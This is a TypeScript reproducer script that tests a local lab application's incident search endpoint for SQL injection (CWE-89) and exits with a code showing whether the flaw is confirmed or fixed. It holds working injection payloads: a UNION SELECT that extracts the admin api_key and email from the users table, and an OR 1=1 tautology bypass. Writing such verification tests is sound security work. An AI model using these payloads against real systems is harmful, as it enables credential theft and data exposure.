import { createLabApp, type LabAppInstance } from '../dist/index.js';

/**
 * Standalone Deterministic Reproducer: SQL Injection (CWE-89)
 *
 * Exit Codes:
 *   1 = Vulnerability CONFIRMED (exploit succeeded: leaked admin credentials or boolean bypass)
 *   0 = Exploit NEUTRALIZED (query parameterized/sanitized, returned empty or safe result)
 *   2 = Unexpected execution error
 */
async function run(): Promise<void> {
  let app: LabAppInstance | null = null;
  let baseUrl = process.env.LAB_APP_URL;

  if (!baseUrl) {
    app = createLabApp({ port: 0 });
    const port = await app.start();
    baseUrl = `http://127.0.0.1:${port}`;
  }

  const cleanup = async () => {
    if (app) {
      await app.stop();
    }
  };

  try {
    // Attack Payload: UNION query extraction targeting admin api_key in users table
    const unionPayload = "' UNION SELECT id, 1, username, 'CRITICAL', role, api_key, email, created_at FROM users --";
    const res = await fetch(`${baseUrl}/api/incidents/search?q=${encodeURIComponent(unionPayload)}`);

    if (res.status !== 200) {
      console.error(`ERROR: Endpoint responded with HTTP ${res.status}: ${await res.text()}`);
      await cleanup();
      process.exit(2);
    }

    const data = await res.json();

    const adminTokenLeaked = Array.isArray(data) && data.some((row: any) =>
      JSON.stringify(row).includes('sk_live_admin_secret')
    );

    // Secondary check: boolean tautology bypass (nomatch' OR 1=1 --)
    let booleanBypass = false;
    if (!adminTokenLeaked) {
      const boolRes = await fetch(`${baseUrl}/api/incidents/search?q=${encodeURIComponent("nomatch' OR 1=1 --")}`);
      if (boolRes.status !== 200) {
        console.error(`ERROR: Secondary check responded with HTTP ${boolRes.status}: ${await boolRes.text()}`);
        await cleanup();
        process.exit(2);
      }
      const boolData = await boolRes.json();
      booleanBypass = Array.isArray(boolData) && boolData.length > 0;
    }

    if (adminTokenLeaked || booleanBypass) {
      console.log('VULNERABILITY_CONFIRMED: SQL Injection (CWE-89) successfully exploited in search endpoint.');
      if (adminTokenLeaked) {
        console.log('  Evidence: Leaked admin credential token from users table via UNION SELECT.');
      }
      if (booleanBypass) {
        console.log('  Evidence: Boolean tautology bypass dumped incidents table.');
      }
      await cleanup();
      process.exit(1);
    } else if (res.status === 200 && Array.isArray(data)) {
      console.log('EXPLOIT_NEUTRALIZED: SQL Injection payload did not execute arbitrary SQL syntax.');
      await cleanup();
      process.exit(0);
    } else {
      console.error('ERROR: Unexpected response payload format:', data);
      await cleanup();
      process.exit(2);
    }
  } catch (err) {
    console.error('ERROR: Unexpected reproducer failure:', err);
    await cleanup();
    process.exit(2);
  }
}

run();
